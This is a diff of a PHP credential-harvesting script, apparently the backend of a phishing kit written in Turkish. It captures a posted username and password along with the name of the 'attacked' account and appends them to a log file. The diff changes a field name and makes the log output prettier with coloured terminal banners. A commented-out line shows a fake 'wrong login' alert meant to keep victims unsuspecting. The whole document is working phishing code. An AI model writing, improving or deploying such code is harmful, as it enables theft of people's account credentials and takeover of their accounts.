@@ -1,20 +1,35 @@
 <?php
 //include "test.php";
 
-if (isset($_POST['kullaniciadi']) && isset($_POST['password']) && isset($_POST['saldiri'])) {
+if (isset($_POST['username']) && isset($_POST['password']) && isset($_POST['saldiri'])) {
 
 $save = fopen("kaydedilen.txt","a+");
-$kullaniciadi = $_POST['kullaniciadi'];
+$username = $_POST['username'];
 $password = $_POST['password'];
 $saldiri = $_POST['saldiri'];
 $vericekilen = ("
-========================================
-SALDIRI YAPILAN KULLANICI ADI >> ".$saldiri."
-========================================
-KULLANICI ADI >> ".$kullaniciadi."
-========================================
-ŞİFRE >> ".$password."
-========================≠===============");
+\e[32m
+	████████████████████████████████████████
+	██
+	██ \e[97mSALDIRI       : \e[32m".$saldiri."\e[32m
+	██
+	████████████████████████████████████████
+
+
+	████████████████████████████████████████
+	██
+	██ \e[97mKULLANICI ADI : \e[32m".$username."\e[32m
+	██
+	████████████████████████████████████████
+
+
+	████████████████████████████████████████
+	██
+	██ \e[97mŞİFRE         : \e[32m".$password."\e[32m
+	██
+	████████████████████████████████████████\e[97m
+        
+	+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-");
 fwrite($save,$vericekilen);
 fclose($save);
 //echo "<script>alert('HATALI GİRİŞ YAPTINIZ !');</script>";
